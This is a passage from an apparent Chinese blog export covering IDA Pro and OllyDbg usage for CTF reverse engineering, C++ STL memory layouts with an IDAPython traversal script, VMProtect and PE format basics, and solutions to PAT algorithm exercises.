head-&gt;next; &#125; putchar(10); system(&quot;pause&quot;); return 0; &#125; 对比源代码中结构的定义与ida对结构体反编译结果来熟悉看伪代码从上面的结果我们可以看出，源代码中定义的结构体它的实质就是分配一块内存，然后这块内存组织了其中变量。但是ida反编译时并不能将其还原出来，它只能得到它的实质结果，那就是一段连续的空间上每个变量分别定义出来。我们在分析出结构体后，插入创建分析出的结构体后再应用就能在IDA中还原出结构体了。 IDA中python脚本的编写 载入脚本执行：alt+f7 打开执行脚本窗口：shift+f2在下面的窗口中写python代码可以很好的和IDA交互。要用的api查官方文档：https://hex-rays.com/wp-content/static/products/ida/support/idapython_docs/ 解决ida反编译遇到：Decompilation failure:xxxx:too big function这是因为ida默认反编译函数的大小只有64K，所以这里会反编译会失败。 这个问题可以通过修改反编译插件的配置文件\\cfg\\hexrays.cfg中MAX_FUNCSIZE，改为1024就好了 动调调试-windows按下图所示选择好指定好选项，程序中下好断点，直接F9程序就调试起来了。 动调调试-linux-x86首先找到IDA的dbgsrv文件夹 进入dbgsrv文件夹 其中linux_server是我们调试32elf文件所要使用的服务程序，linux_server64是调试64elf所要使用的服务程序。 将上面提到的2个服务程序复制到linux虚拟机和所要调试的文件放在同一个文件夹下。这里为了以后方便也可以放入&#x2F;usr&#x2F;bin&#x2F;下，以后直接通过命令（linux_server或linux_server64）就启动了。 使用chmod 777 linux_server linux_server64，赋予这两个文件有执行的权限。 然后根据我们所要调试程序的位数启动对应版本的服务程序。 使用ifconfig命令查看当前虚拟机的ip地址 配置ida中调试选项 最后注意本机与目的linux环境能相互ping通，下好断点，直接F9启动程序即开始调试。 IDA中制作sig文件IDA中的sig文件是什么？它是满足IDA中FLIRT(库文件快速识别与鉴定技术)而使用的一种签名文件。它使用自定义的格式，记录了一些库函数的特征序列值。在我们找到合适的库文件并以此制作相应的签名文件后将其应用IDA中，它将通过特征值自动去匹配程序中的函数，并对匹配上的函数自动重命名（要注意的是：就算匹配上它也只会对IDA默认命名函数的函数重命名，换句话说就是如果之前我们对该函数已经进行了重命名，那么之后就算签名文件匹配上这个函数也不会对其进行重命名）。这能很好的解决静态编译且去除符号程序因本身函数与库函数混杂在一起增大了我们分析程序难度的问题，帮助减少工作能，更快的去分析程序本身的函数。 IDA中自带的签名文件在IDA安装目录中的sig文件夹下我们能找到IDA中本身自带的签名文件。不同文件夹表示不同架构平台要使用的签名文件。这里我们在自己添加签名文件时也一定要注意好其架构。 在IDA自带的签名文件中只有一小部分类unix下的签名文件，这是因为在类unix下使用编译器的是开源的gcc，不同的linux发行版本的libc.a也都不尽相同且更新很快，IDA也就不可能把所有版本的libc.a都制作一份签名文件保存下来。所以在我们分析静态链接且去除了符号表的elf文件时，可以发现很多库函数都没有识别出来，这在程序很大时无疑增加了它的分析难度和我们所花费的精力。 下面也是以一个静态链接且去除了符号的elf文件来一步一步找到它的库并制作相应的sig文件进而恢复它的符号。 查看分析的elf文件未引用sig文件时的main函数如下所示，所有函数都是没有符号的。 查看该elf文件的字符串信息尽可能找到该elf文件的编译平台 strings -a 1 | grep ‘ubun’ 找到目标环境下的libc.a文件 whereis libc.a 下载IDA官方提供的FLAIR工具集，我们选择使用linux下平台的文件将linux文件夹拖入我们的linux环境中 使用linux文件下的pelf将libc.a转化为libc.pat .&#x2F;linux&#x2F;pelf libc.a libc.pat 如果正常的话不会有提示信息，在当前文件下生成libc.pat文件。 但也常出现下面这个错误： 看意思是不能识别重定位类型，那我们在上面的命令下加上如下选项即可： .&#x2F;linux&#x2F;pelf -r42:0:0 libc.a libc.pat 42是重定位类型，根据提示的错误来。 接着使用sigmake将libc.pat文件制作成libc.sig文件 .&#x2F;linux&#x2F;sigmake -n“my_sig” libc.pat libc.sig -n后是添加的注释信息 正常的话也是直接就生成相应的sig文件了。但也常出现下面的错误： 意思是有22个函数它们同一个特征值不止对应一个函数，如果制作成了sig文件在匹配成功时也不知道到底应用那个函数名字。 它会在当前目录下生成一个.exc文件，它是可编辑的，我们将该.exc文件的前几行注释删除，在我们要选择特征值对应的函数名称最前面加一个+号即可，如果不管就什么也不加。如下图，我选择了第一个该特征值的第一个函数。 修改完.exc文件后，再次重复之前生成sig文件的命令就好了。 .&#x2F;linux&#x2F;sigmake -n“my_sig” libc.pat libc.sig 应用生成的sig文件到IDA中将生成的签名文件复制到IDA中的sig目录下。 回到IDA中之前分析的该elf文件，shift+f5打开应用库的窗口，然后右键把我们新复制到的sig目录下的sig文件添加进来。如下图，添加后，成功匹配了程序中的735个函数。而上面之前的libc却匹配了0个函数，这也正说明了版本变化带来的差异之大。 查看应用新sig文件后的main函数如下图，scanf和puts相关函数都识别出来了。","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"工具使用","slug":"ctf/工具使用","permalink":"https://pa1r0t.github.io/categories/ctf/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"IDA","slug":"IDA","permalink":"https://pa1r0t.github.io/tags/IDA/"}]},{"title":"OD工具的使用","slug":"OD工具的使用","date":"2024-06-24T14:06:30.000Z","updated":"2024-06-26T15:05:26.173Z","comments":true,"path":"2024/06/24/OD工具的使用/","link":"","permalink":"https://pa1r0t.github.io/2024/06/24/OD%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"​ Ollydbg","text":"​ Ollydbg OD介绍​ OllyDbg（以作者Oleh Yuschuk命名）是一款用于Windows32位二进制文件的汇编代码级反汇编调试工具，有友好的用户界面，并支持第三方插件扩展功能。该软件是免费的，但共享软件许可证要求用户注册。当前版本的OllyDbg不支持反汇编64位的二进制文件。 OllyDbg 1.10版本是1.x的最终版本。2.0版本于2010年6月发布，此版本重写了OllyDbg。 OllyDbg由于它的易用性（任何32位可执行文件都可以由调试器使用，并在二进制码&#x2F;汇编代码中实时编辑）通常用于程序的逆向工程，常被用来破解软件，也常用于程序的动态调试和恶意软件分析 什么是反汇编？反汇编： ​ 在传统的软件开发模型中，程序员使用编辑器、汇编器和链接器中的一个或几个创建可执行程序。为了回溯编程过程（或者叫对程序进行逆向工程），我们使用各种工具来撤销汇编和编译过程。这些工具就叫做反汇编工具和反汇编器。反汇编器撤销汇编过程，我们可以得到汇编语言形式的输出结果（以机械语言作为输入）。反编译器则以汇编语言甚至是机械语言为输入，输出结果是高级语言。 C语言程序用作实验#include &lt;stdio.h&gt; #include &lt;windows.h&gt; int main(void) &#123; char title[] = &quot;OD工具使用&quot;; char text[] = &quot;学习使用OD_xxx&quot;; MessageBoxA(0, text, title, 1); return 0; &#125; OD基本使用OD工具目录中各个子目录的介绍： ico目录中是OD程序中的图标图片。 plugin目录是存放我们OD程序中使用插件的目录。 skins目录是OD程序中使用皮肤文件。 UDD目录是存放我们分析过的文件的分析记录，如下断点情况等。 OD工具目录中各个子文件的介绍： ollydbg.ini是od程序及其插件的配置文件 PEiD是程序查壳软件 Udd Cleaner.exe是清楚UDD目录下的缓存文件 OD主界面整体介绍：OD程序上各个键位的讲解： 从左往右： 首先黄色框显示了程序此时的状态，这里是暂停 接着打开文件夹 f3 然后是重新载入程序分析 ctrl+f2 再是运行按钮 f9 最后是暂停按钮 f12","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"工具使用","slug":"ctf/工具使用","permalink":"https://pa1r0t.github.io/categories/ctf/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"OD","slug":"OD","permalink":"https://pa1r0t.github.io/tags/OD/"}]},{"title":"STL函数识别","slug":"STL函数识别","date":"2024-06-23T04:50:23.000Z","updated":"2024-06-25T14:03:09.776Z","comments":true,"path":"2024/06/23/STL函数识别/","link":"","permalink":"https://pa1r0t.github.io/2024/06/23/STL%E5%87%BD%E6%95%B0%E8%AF%86%E5%88%AB/","excerpt":"​ C++方向逆向STL","text":"​ C++方向逆向STL 什么是STLSTL是C++标准模板库，内置了很多常用的数据结构和算法，例如动态数组、队列等。故STL在日常编程开发中很常用，故在逆向过程中学习STL是必要的。 逆向中STL的主要问题： 缺少符号，无法判断STL容器类型 STL内部数据结构相当复杂，难以提取数据 O3优化使用大量STL函数被内联 O3优化是为了提高程序编译运行速度采用的优化方式，函数内联是将函数代码直接嵌入原代码中，减少了函数调用带来的损失。 这使得逆向过程中会很难分清是STL的代码还是用户自己的代码。 常见的STL容器： std::string 字符串 std::vector 动态数组 std::map 关联数组 案例介绍无优化有符号： O3+有符号 对比O0和O3的差距非常大 STL内存布局在调试程序时观察数据内存布局推断容器类型，以64位gnu C++的stl为例 std::string 结构大致如下： struct basic_string &#123; char *begin_; //actual string data size_t size; //actual size union &#123; size_t capacity; //used if larger than 15 bytes char sso_buffer[16];//used if smaller than 16 bytes &#125; &#125; 该结构体固定长度为32字节，4个dq 如果字符串长度小于16，数据就存储在当前结构，否则重新分配内存存放数据 std::vector 内存布局 struct vector_point &#123; Point* start;//指向数据起始长度 Point* end;//指向数据结束地址 Point* max;//指向已分配内存的最大长度 &#125; 固定长度24字节，3个dq 调试验证 std::map内存布局，stl内部使用红黑树实现std::map，要获得所有键值对，这里只需要遍历二叉树即可 struct std::map &#123; void* allocator; //ignore color color; //ignore node * root; node * leftmost; //ignore node * rightmost; //ignore size_t node_count; &#125; struct node &#123; color color; node * parent; node * left; node * right; TypeKey key; //data_area TypeValue value; &#125; 解析脚本 import idautils import idaapi import idc # parse gnu c++ stlmap def parse_gnu_map_header(address): root = idc.read_dbg_qword(address + 0x10) return root def parse_gnu_map_node(address): left = idc.read_dbg_qword(address + 0x10) right = idc.read_dbg_qword(address + 0x18) data = address + 0x20 return left, right, data def parse_gnu_map_travel(address): # address &lt;- std::map struct address result = [] worklist = [parse_gnu_map_header(address)] while len(worklist) &gt; 0: addr = worklist.pop() (left, right, data) = parse_gnu_map_node(addr) if left &gt; 0: worklist.append(left) if right &gt; 0: worklist.append(right); result.append(data) return result # example elements = parse_gnu_map_travel(0x564D240D0EB0) for elem in elements: print(hex(elem))","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"Windows逆向","slug":"ctf/Windows逆向","permalink":"https://pa1r0t.github.io/categories/ctf/Windows%E9%80%86%E5%90%91/"}],"tags":[]},{"title":"SMC原理","slug":"SMC原理","date":"2024-06-22T10:31:02.000Z","updated":"2024-06-25T14:03:01.702Z","comments":true,"path":"2024/06/22/SMC原理/","link":"","permalink":"https://pa1r0t.github.io/2024/06/22/SMC%E5%8E%9F%E7%90%86/","excerpt":"SMC加密技术","text":"SMC加密技术","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"Windows逆向","slug":"ctf/Windows逆向","permalink":"https://pa1r0t.github.io/categories/ctf/Windows%E9%80%86%E5%90%91/"}],"tags":[]},{"title":"VMProtect原理与还原(1)","slug":"VMProtect原理与还原-1","date":"2024-06-21T05:24:07.000Z","updated":"2024-06-25T14:04:20.311Z","comments":true,"path":"2024/06/21/VMProtect原理与还原-1/","link":"","permalink":"https://pa1r0t.github.io/2024/06/21/VMProtect%E5%8E%9F%E7%90%86%E4%B8%8E%E8%BF%98%E5%8E%9F-1/","excerpt":"​ 工具、脱壳","text":"​ 工具、脱壳 什么是VMProtect?​ Virtual Machine Protect. 虚拟机保护 ​ VMProtect的基本原则是通过使应用程序代码和逻辑变得非常复杂,执行虚拟化代码片段的虚拟机是嵌入到受保护应用程序的结果代码中的。 ​ 虚拟化代码，无需解码，不同于对代码进行加密&#x2F;解密，VMProtect让其在虚拟CPU上运行。而这个异于常规X36&#x2F;X64CPU的虚拟CPU，会对每个受保护的文件发出不同的指令集。 ​ VMP有自己的虚拟CPU和虚拟指令集，那么对原生指令进行保护时，将原生指令转换为虚拟指令。 还原效果：原汇编代码： lea eax,dword ptr ds:[edx+0x6] add eax,ecx retn 还原后代码： lea dreg[3c], [ dreg[14] + 00000006 ] lea dreg[00], [ dreg[08] + dreg[3c] ] retn 我们看到寄存器还是虚拟寄存器，最后需要我们进行寄存器的转换分析，转换为真实寄存器，第二条lea指令经过寄存器变换，也将还原成add指令 预备知识dll的主要功能kernel32.dllkernel32.dll是Windows 9x&#x2F;Me中非常重要的32位动态链接库文件，属于内核级文件。它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。 user32.dlluser32.dll是Windows用户界面相关应用程序接口，用于包括Windows处理，基本用户界面等特性，如创建窗口和发送消息。 在早期32-bit 版本的Windows中，用户控件是在ComCtl32中实现的，但是一些控件的显示功能是在User32.dll中实现的。例如在一个窗口中非客户区域（边框和菜单）的绘制就是由User32.dll来完成的。User32.dll 是操作系统的一个核心控件，它和操作系统是紧密联系在一起的。也就是说，不同版本的Windows中User32.dll 是不同。因此，应用程序在不同版本的Windows中运行的时候，由于User32.dll的不同，会导致应用程序的界面通常会有微小的不同。 gdi32.dllgdi32.dll是Windows GDI图形用户界面相关程序，包含的函数用来绘制图像和显示文字 comdlg32.dllcomdlg32.dll是Windows应用程序公用对话框模块，用于例如打开文件对话框。 advapi32.dlladvapi32.dll是一个高级API应用程序接口服务库的一部分，包含的函数与对象的安全性，注册表的操控以及事件日志有关。 shell32.dllshell32.dll是Windows的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能。 严格来讲，它只是代码的合集，真正执行这些功能的是操作系统的相关程序，dll文件只是根据设置调用这些程序的相关功能罢了。 ole32.dllole32.dll是对象链接和嵌入相关模块。 odbc32.dllodbc32.dll是ODBC数据库查询相关文件。 PE文件格式PE结构可以大致分为: DOS部分 u_IMAGE_DOS_HEADER typedef struct _IMAGE_DOS_HEADER &#123; WORD e_magic; WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; WORD e_cs; WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; 该结构体中需要掌握的字段只有 2 个，分别是第一个字段 e_magic 和最后一个字段 e_lfanew 字段 e_magic字段:DOS 可执行文件的标识符，占用 2 字节。该位置保存着的字符是“MZ” e_lfanew字段：保存着PE头的起始位置。 作用： 定位PE文件头开始位置，也可用于PE文件合法性检测 ​ u_IMAGE_NT_HEADERS NT头（PE头） DOS头偏移多少是PE头位置 typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; //PE标识 IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER OptionalHeader; &#125; IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS; PE文件头 u_IMAGE_FILE_HEADER typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; WORD NumberOfSections; //主要关心区段数目 DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; &#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; _IMAGE_OPTIONAL_HEADER typedef struct _IMAGE_OPTIONAL_HEADER &#123; WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; //入口点 DWORD BaseOfCode; DWORD BaseOfData; DWORD ImageBase; //映像基地址/模块地址 DWORD SectionAlignment; //区段对齐 DWORD FileAlignment; //文件对齐 WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; //映像大小 DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; //dll属性 DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];//数据目录包含在选项头里 &#125; IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER; 节数据(块数据) u_IMAGE_DATA_DIRECTORY typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size; &#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; #define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16 //16个数据目录 区域段结构 u_IMAGE_SECTION_HEADER typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME];//区段名称 union &#123; DWORD PhysicalAddress; DWORD VirtualSize;//程序加载后区段大小 &#125; Misc; DWORD VirtualAddress;//程序加载后区段地址 DWORD SizeOfRawData;//文件中数据大小 DWORD PointerToRawData;//文件中数据偏移 DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics;//区段属性 &#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; #define IMAGE_SIZEOF_SECTION_HEADER 40 调试信息","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"前置知识学习","slug":"re/前置知识学习","permalink":"https://pa1r0t.github.io/categories/re/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"VMProtect","slug":"VMProtect","permalink":"https://pa1r0t.github.io/tags/VMProtect/"}]},{"title":"有理数四则运算","slug":"有理数四则运算","date":"2023-05-16T08:49:16.000Z","updated":"2024-06-25T13:32:42.165Z","comments":true,"path":"2023/05/16/有理数四则运算/","link":"","permalink":"https://pa1r0t.github.io/2023/05/16/%E6%9C%89%E7%90%86%E6%95%B0%E5%9B%9B%E5%88%99%E8%BF%90%E7%AE%97/","excerpt":"诸多细节一不小心就写烂了","text":"诸多细节一不小心就写烂了 题目：本题要求编写程序，计算 2 个有理数的和、差、积、商。 输入格式：输入在一行中按照 a1/b1 a2/b2 的格式给出两个分数形式的有理数，其中分子和分母全是整型范围内的整数，负号只可能出现在分子前，分母不为 0。 输出格式：分别在 4 行中按照 有理数1 运算符 有理数2 = 结果 的格式顺序输出 2 个有理数的和、差、积、商。注意输出的每个有理数必须是该有理数的最简形式 k a/b，其中 k 是整数部分，a/b 是最简分数部分；若为负数，则须加括号；若除法分母为 0，则输出 Inf。题目保证正确的输出中没有超过整型范围的整数。 输入样例 1：2/3 -4/2 输出样例 1：2/3 + (-2) = (-1 1/3) 2/3 - (-2) = 2 2/3 2/3 * (-2) = (-1 1/3) 2/3 / (-2) = (-1/3) 输入样例 2：5/3 0/6 输出样例 2：1 2/3 + 0 = 1 2/3 1 2/3 - 0 = 1 2/3 1 2/3 * 0 = 0 1 2/3 / 0 = Inf 原先求最小公倍数代码： while(m != n)&#123; //创立两个变量来求最小公约数 if(m &gt; n) m -= n; else n -= m; &#125; 运行超时： 超时的原因可能是一个变量很大，一个变量很小，循环的次数太多了 大佬的代码： int gcd(int t1, int t2) &#123; return t2 == 0 ? t1 : gcd(t2, t1 % t2); &#125; 辗转相除法递归写法 c++中库函数__gcd()求最小公倍数：要包含头文件#include 不超时答案错误： 柳神分析： func(m, n)的作用是对m&#x2F;n的分数进行化简，gcd(t1, t2)的作用是计算t1和t2的最大公约数～在func函数中，先看m和n里面是否有0（即m*n是否等于0），如果分母n&#x3D;0，输出Inf，如果分子m&#x3D;0，输出”0″～flag表示m和n是否异号，flag&#x3D;true表示后面要添加负号”(-“和括号”)”，再将m和n都转为abs(m)和abs(n)，即取他们的正数部分方便计算～x &#x3D; m&#x2F;n为m和n的可提取的整数部分，先根据flag的结果判断是否要在前面追加”(-“，然后根据x是否等于0判断要不要输出这个整数位，接着根据m%n是否等于0的结果判断后面还有没有小分数，如果m能被n整除，表示没有后面的小分数，那么就根据flag的结果判断要不要加”)”，然后直接return～如果有整数位，且后面有小分数，则要先输出一个空格，接着处理剩下的小分数，先把m分子减去已经提取出的整数部分，然后求m和n的最大公约数t，让m和n都除以t进行化简～最后输出“m&#x2F;n”，如果flag&#x3D;&#x3D;true还要在末尾输出”)” 判断m和n是否异号千万不要写成判断m*n是否小于0，因为m*n的结果可能超过了long long int的长度，导致溢出大于0，如果这样写的话会有一个测试点无法通过（语言本身的问题，python不存在的） 正确代码： #include &lt;iostream&gt; #include &lt;cmath&gt; #include &lt;string&gt; using namespace std; long long gcd(long long a, long long b)&#123; return (b != 0) ? gcd(b,a%b) : a; &#125; string func(long long a,long long b)&#123; if(!a || !b) return b == 0 ? &quot;Inf&quot; : &quot;0&quot;; // 分子分母有一个是0的情况 string res = ((a &gt; 0 &amp;&amp; b &lt; 0) || (a &lt; 0 &amp;&amp; b &gt; 0)) ? &quot;(-&quot; : &quot;&quot;; // 判断正负 a = abs(a);b = abs(b); long long x = a/b; res += (x != 0) ? to_string(x) : &quot;&quot;; //整数部分 if(a % b == 0)&#123; if(res[0] == &#39;(&#39;) return res+&quot;)&quot;; return res; &#125; else if(x != 0) res += &quot; &quot;; a = a - b * x; long long n = gcd(a,b); a /= n;b /= n; res += to_string(a) + &quot;/&quot; + to_string(b); if(res[0] == &#39;(&#39;) return res + &quot;)&quot;; return res; &#125; int main(void)&#123; long long f1,f2,m1,m2; scanf(&quot;%lld/%lld %lld/%lld&quot;,&amp;f1,&amp;m1,&amp;f2,&amp;m2); string str1 = func(f1,m1),str2 = func(f2,m2); cout &lt;&lt; str1 &lt;&lt; &quot; + &quot; &lt;&lt; str2 &lt;&lt; &quot; = &quot; &lt;&lt; func(f1*m2+f2*m1,m1*m2) &lt;&lt; endl; cout &lt;&lt; str1 &lt;&lt; &quot; - &quot; &lt;&lt; str2 &lt;&lt; &quot; = &quot; &lt;&lt; func(f1*m2-f2*m1,m1*m2) &lt;&lt; endl; cout &lt;&lt; str1 &lt;&lt; &quot; * &quot; &lt;&lt; str2 &lt;&lt; &quot; = &quot; &lt;&lt; func(f1*f2,m1*m2) &lt;&lt; endl; cout &lt;&lt; str1 &lt;&lt; &quot; / &quot; &lt;&lt; str2 &lt;&lt; &quot; = &quot; &lt;&lt; func(f1*m2,f2*m1); &#125; 其实就是要把所有变量都给成long long类型，题目说好在整型范围内，气死我了😒 然后这题我原本的想法是把四则运算全部合到一起，但是太混乱了。柳神这样把分数表示单独弄成一个函数，把运算全部改成简单数学运算，所有的细节都合成一个函数中，太妙了！！好绝👍","categories":[{"name":"PAT练习","slug":"PAT练习","permalink":"https://pa1r0t.github.io/categories/PAT%E7%BB%83%E4%B9%A0/"}],"tags":[]},{"title":"双指针优化","slug":"双指针优化","date":"2023-05-11T07:21:59.000Z","updated":"2024-06-25T13:31:53.418Z","comments":true,"path":"2023/05/11/双指针优化/","link":"","permalink":"https://pa1r0t.github.io/2023/05/11/%E5%8F%8C%E6%8C%87%E9%92%88%E4%BC%98%E5%8C%96/","excerpt":"完美数列","text":"完美数列 第一题给定一个正整数数列，和正整数 p，设这个数列中的最大值是 M，最小值是 m，如果 M≤m**p，则称这个数列是完美数列。 现在给定参数 p 和一些正整数，请你从中选择尽可能多的数构成一个完美数列。 输入格式：输入第一行给出两个正整数 N 和 p，其中 N（≤105）是输入的正整数的个数，p（≤109）是给定的参数。第二行给出 N 个正整数，每个数不超过 109。 输出格式：在一行中输出最多可以选择多少个数可以用它们组成一个完美数列。 输入样例：10 8 2 3 20 4 5 1 6 7 8 9 输出样例：8 题目分析：原先我的想法是假设最长数列就是n，然后有序数组进行两端判断。想法是有，但是代码不知道怎么写 柳神是用双指针，这题其实双指针的时间复杂度都能上n^2^了，所以这里双指针要优化一下，用res来存放当前最长长度， 第一重循环用i&#x3D;0~n,第二层循环j就不能从0开始了否则太慢了，而且重复了。 第二重循环用j&#x3D;i+res~n 第二重循环中判断到不符合条件就直接跳出了，因为这是个有序数组，之后的数据也都不成立了。 所以做这两个优化后，效率杠杠的👍 #include&lt;iostream&gt; #include&lt;algorithm&gt; using namespace std; int main(void)&#123; int n; long p; cin &gt;&gt; n &gt;&gt; p; int a[n],i,j; for(i = 0; i &lt; n ;i++) cin &gt;&gt; a[i]; sort(a,a+n); int tmp = 0,res = 0; for(i = 0; i &lt; n ;i++)&#123; for(j=i + res;j &lt; n;j++) if(a[i] * p &gt;= a[j] &amp;&amp; (tmp = j - i + 1) &gt; res) res = tmp; else break; &#125; cout &lt;&lt; res; return 0; &#125; 归并与插入插入排序是迭代算法，逐一获得输入数据，逐步产生有序的输出序列。每步迭代中，算法从输入序列中取出一元素，将之插入有序序列中正确的位置。如此迭代直到全部元素有序。 归并排序进行如下迭代操作：首先将原始序列看成 N 个只包含 1 个元素的有序子序列，然后每次迭代归并两个相邻的有序子序列，直到最后只剩下 1 个有序的序列。 现给定原始序列和由某排序算法产生的中间序列，请你判断该算法究竟是哪种排序算法？ 输入格式：输入在第一行给出正整数 N (≤100)；随后一行给出原始序列的 N 个整数；最后一行给出由某排序算法产生的中间序列。这里假设排序的目标序列是升序。数字间以空格分隔。 输出格式：首先在第 1 行中输出Insertion Sort表示插入排序、或Merge Sort表示归并排序；然后在第 2 行中输出用该排序算法再迭代一轮的结果序列。题目保证每组测试的结果是唯一的。数字间以空格分隔，且行首尾不得有多余空格。 输入样例 1：10 3 1 2 8 7 5 9 4 6 0 1 2 3 7 8 5 9 4 6 0 输出样例 1：Insertion Sort 1 2 3 5 7 8 9 4 6 0 输入样例 2：10 3 1 2 8 7 5 9 4 0 6 1 3 2 8 5 7 4 9 0 6 输出样例 2：Merge Sort 1 2 3 8 4 5 7 9 0 6 题目分析： 这题由于插入排序是从后往前的，所以插入排序的中间序列一定是，前段有序，后段和原序列相同。 归并排序的话没有直观的规律，这里不是插入就是归并了，极端情况的数据没有意义 这里归并排序的下一个序列，由于无法判断是第几次归并，所以只能用原序列进行一次次归并比较中间序列，直到全部吻合 这里值得学习的是，用c++的sort函数，直接忽略了插入排序和归并排序的具体排序细节，运行效率可能没有她两好，不过开发效率很香 #include&lt;iostream&gt; #include&lt;algorithm&gt; using namespace std; int main(void)&#123; int n; cin &gt;&gt; n; int a[n],b[n],i,j; for(i=0;i &lt; n;i++) cin &gt;&gt; a[i]; for(i=0;i &lt; n;i++) cin &gt;&gt; b[i]; for(i=0;b[i] &lt;= b[i+1];i++); for(j=i + 1;b[j] == a[j] &amp;&amp; j &lt; n;j++); if(j == n)&#123; cout &lt;&lt; &quot;Insertion Sort&quot; &lt;&lt; endl; sort(a,a+i+2); &#125;else&#123; cout &lt;&lt; &quot;Merge Sort&quot; &lt;&lt; endl; int flag = 1 , k = 1; while(flag)&#123; flag = 0; for(i = 0; i &lt; n ; i++) if(a[i] != b[i]) flag = 1; k *= 2; for(i = 0; i &lt; n / k ; i++) sort(a + i * k, a + (i+1)*k ); sort(a + n / k * k, a + n); // n / k 不整除的情况下，剩余部分给计算进去 &#125; &#125; for(i=0;i &lt; n;i++) &#123; if(i != 0) cout &lt;&lt; &quot; &quot;; cout &lt;&lt; a[i]; &#125; return 0; &#125;","categories":[{"name":"PAT练习","slug":"PAT练习","permalink":"https://pa1r0t.github.io/categories/PAT%E7%BB%83%E4%B9%A0/"}],"tags":[]},{"title":"关于c++中double误差问题","slug":"关于c-中double误差问题","date":"2023-05-10T02:46:59.000Z","updated":"2024-06-25T13:31:10.367Z","comments":true,"path":"2023/05/10/关于c-中double误差问题/","link":"","permalink":"https://pa1r0t.github.io/2023/05/10/%E5%85%B3%E4%BA%8Ec-%E4%B8%ADdouble%E8%AF%AF%E5%B7%AE%E9%97%AE%E9%A2%98/","excerpt":"question: double","text":"question: double PAT甲级题给定一个正数数列，我们可以从中截取任意的连续的几个数，称为片段。例如，给定数列 { 0.1, 0.2, 0.3, 0.4 }，我们有 (0.1) (0.1, 0.2) (0.1, 0.2, 0.3) (0.1, 0.2, 0.3, 0.4) (0.2) (0.2, 0.3) (0.2, 0.3, 0.4) (0.3) (0.3, 0.4) (0.4) 这 10 个片段。 给定正整数数列，求出全部片段包含的所有的数之和。如本例中 10 个片段总和是 0.1 + 0.3 + 0.6 + 1.0 + 0.2 + 0.5 + 0.9 + 0.3 + 0.7 + 0.4 &#x3D; 5.0。 输入格式：输入第一行给出一个不超过 105 的正整数 N，表示数列中数的个数，第二行给出 N 个不超过 1.0 的正数，是数列中的数，其间以一个空格分隔。 输出格式：在一行中输出该序列所有片段包含的数之和， 输入样例：4 0.1 0.2 0.3 0.4 输出样例：5.00 关于这题的分析： 我是看了柳神的，我天真地以为一个数据出现了n-1词，但比如0.2在0.1的条件下，就已经出现了3次了 柳神原话：将数列中的每个数字读取到temp中，假设我们选取的片段中包括temp，且这个片段的首尾指针分别为p和q，那么对于p，有i种选择，即12…i，对于q，有n-i+1种选择，即i, i+1, … n，所以p和q组合形成的首尾片段有i * (n-i+1)种，因为每个里面都会出现temp，所以temp引起的总和为temp * i * (n – i + 1)；遍历完所有数字，将每个temp引起的总和都累加到sum中，最后输出sum的值 原先的代码： #include&lt;iostream&gt; using namespace std; int main(void)&#123; int n; double tmp,sum = 0; cin &gt;&gt; n; for(int i=0;i&lt;n;i++)&#123; cin &gt;&gt; tmp; sum += tmp * (i + 1) * (n - i); &#125; printf(&quot;%.2f&quot;,sum); return 0; &#125; 结果不太行啊 这里用double进行运算时是会产生误差的，因为有些数用二进制表示不出来，c++中只能粗略表示. 具体参考文章：由一道 OJ 引发的关于 double 类型的一些思考 | Lust for Life (bipy.me) 